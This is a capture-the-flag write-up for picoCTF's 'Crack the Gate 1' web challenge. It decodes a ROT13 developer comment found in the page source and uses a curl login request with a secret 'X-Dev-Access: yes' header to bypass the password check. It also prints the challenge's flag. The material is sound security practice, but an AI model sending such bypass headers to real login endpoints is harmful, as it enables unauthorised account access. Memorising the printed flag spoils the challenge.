# Crack the Gate 1

**Link**: https://play.picoctf.org/practice/challenge/520

**Difficulty**: easy

## Description

We're in the middle of an investigation. A person of interest is hiding sensitive
data inside a restricted web portal. We know the login email
`ctf-player@picoctf.org` but not the password — and it feels like the developer left
a secret way in. Can you figure it out?

## Resources

- **login.html**: the saved login page (contains the leaking comment)
- **enc.txt**: the ROT13-encoded developer comment
- **dec.txt**: the decoded comment (produced during the solve)

## How to solve

1. **View the page source.** There's a developer comment left in the HTML, ROT13'd
   (`ABGR` = `NOTE`, a dead giveaway):

       <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
       <!-- Remove before pushing to production! -->

2. **Decode the ROT13:**

       cat enc.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'

   Output:

       NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"

3. **Send the magic header** with the login request. The server ignores the wrong
   password once `X-Dev-Access: yes` is present:

       curl -s -X POST http://<host>:<port>/login \
         -H "Content-Type: application/json" \
         -H "X-Dev-Access: yes" \
         -d '{"email":"ctf-player@picoctf.org","password":"anything"}'

   Response:

       {
         "success": true,
         "email": "ctf-player@picoctf.org",
         "flag": "picoCTF{brut4_f0rc4_3c6b118b}"
       }

## Flag

    picoCTF{brut4_f0rc4_3c6b118b}
